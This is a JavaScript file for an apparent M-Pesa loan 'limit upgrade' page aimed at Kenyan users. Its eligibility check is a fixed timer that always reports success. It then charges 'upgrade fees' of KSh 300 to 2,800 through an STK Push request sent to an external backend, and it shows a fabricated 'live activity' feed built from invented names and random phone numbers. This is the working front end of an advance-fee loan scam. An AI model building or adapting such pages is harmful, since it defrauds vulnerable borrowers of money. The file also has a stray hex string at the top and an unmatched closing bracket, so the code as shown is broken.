0x61a828cc33d4e6e1b978218d6ddbe59b9db6399b
// =======================
// LOAN OPTIONS
// =======================

const loans = [
    { amount: "KSh 5,000", fee: "KSh 300" },
    { amount: "KSh 10,000", fee: "KSh 500" },
    { amount: "KSh 20,000", fee: "KSh 800" },
    { amount: "KSh 30,000", fee: "KSh 1,200" },
    { amount: "KSh 50,000", fee: "KSh 2,200" },
    { amount: "KSh 70,000", fee: "KSh 2,800" }
];

// =======================
// ELEMENTS
// =======================

const page1 = document.getElementById("page1");
const page2 = document.getElementById("page2");
const page3 = document.getElementById("page3");

const phone = document.getElementById("phone");
const checkBtn = document.getElementById("checkBtn");

const loader = document.getElementById("loader");
const popup = document.getElementById("successPopup");
const continueBtn = document.getElementById("continueBtn");

const loanList = document.getElementById("loanList");

const loanAmount = document.getElementById("loanAmount");
const loanFee = document.getElementById("loanFee");

const stkPhone = document.getElementById("stkPhone");

const payBtn = document.getElementById("payBtn");
const paymentStatus = document.getElementById("paymentStatus");

const steps = document.querySelectorAll(".step");

let customerPhone = "";

// =======================
// CHECK ELIGIBILITY
// =======================

checkBtn.addEventListener("click", () => {

    customerPhone = phone.value.trim();

    if (customerPhone.length < 10) {
        alert("Please enter a valid M-Pesa number.");
        return;
    }

    loader.style.display = "flex";

    setTimeout(() => {

        loader.style.display = "none";

        popup.style.display = "flex";

    }, 2500);

});

// =======================
// CONTINUE
// =======================

continueBtn.addEventListener("click", () => {

    popup.style.display = "none";

    page1.classList.remove("active");
    page2.classList.add("active");

    steps[0].classList.remove("active");
    steps[1].classList.add("active");

});

// =======================
// CREATE LOAN CARDS
// =======================

loans.forEach((loan) => {

    const card = document.createElement("div");

    card.className = "loan-card";

    card.innerHTML = `
        <div class="loan-info">
            <h3>${loan.amount}</h3>
            <span>Upgrade Fee: ${loan.fee}</span>
        </div>

        <button class="upgrade-btn">
            UPGRADE →
        </button>
    `;

    card.querySelector("button").addEventListener("click", () => {

        page2.classList.remove("active");
        page3.classList.add("active");

        steps[1].classList.remove("active");
        steps[2].classList.add("active");

        loanAmount.innerHTML = loan.amount;
        loanFee.innerHTML = loan.fee;

        stkPhone.value = customerPhone;

    });

    loanList.appendChild(card);

});

// =======================
// PAY BUTTON
// =======================

payBtn.addEventListener("click", async () => {

    const phoneNumber = stkPhone.value.trim();

    // Remove commas and "KSh" from the fee
    const amount = loanFee.innerHTML.replace(/[^\d]/g, "");

    if (phoneNumber.length < 10) {
        paymentStatus.style.color = "red";
        paymentStatus.innerHTML = "Please enter a valid M-Pesa number.";
        return;
    }

    paymentStatus.style.color = "#0ba84b";
    paymentStatus.innerHTML = "Sending STK Push...";

    try {

        const response = await fetch(
            "https://mpesa-stk-backend-d3tl.onrender.com/api/stk",
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    phone: phoneNumber,
                    amount: Number(amount)
                })
            }
        );

        const data = await response.json();

        if (response.ok) {

            paymentStatus.style.color = "#0ba84b";

            paymentStatus.innerHTML =
                "✅ STK Push sent successfully. Check your phone and enter your M-Pesa PIN.";

            console.log(data);

        } else {

            paymentStatus.style.color = "red";

            paymentStatus.innerHTML =
                data.message || "Unable to send STK Push.";

            console.log(data);

        }

    } catch (error) {

        console.error(error);

        paymentStatus.style.color = "red";

        paymentStatus.innerHTML =
            "Unable to connect to the payment server.";

    }

});
}); // End of payBtn.addEventListener

// =======================
// LIVE ACTIVITY
// =======================

const names = [
    "Brian O.",
    "James M.",
    "Kevin K.",
    "Faith N.",
    "Mercy A.",
    "John K.",
    "Peter O.",
    "Susan W.",
    "Dennis M.",
    "Grace N."
];

const actions = [
    "boosted",
    "increased",
    "raised"
];

function randomPhone() {
    const prefix = ["071","072","073","074","075","076","077","078","079","011"];
    const p = prefix[Math.floor(Math.random() * prefix.length)];
    const first = Math.floor(Math.random() * 900) + 100;
    const last = Math.floor(Math.random() * 900) + 100;

    return `${p}${first}***${last}`;
}

function showActivity() {
    const name = names[Math.floor(Math.random() * names.length)];
    const action = actions[Math.floor(Math.random() * actions.length)];

    document.getElementById("activityText").innerHTML =
        `${name} (${randomPhone()}) ${action} their limit just now`;
}

showActivity();
setInterval(showActivity, 7000);

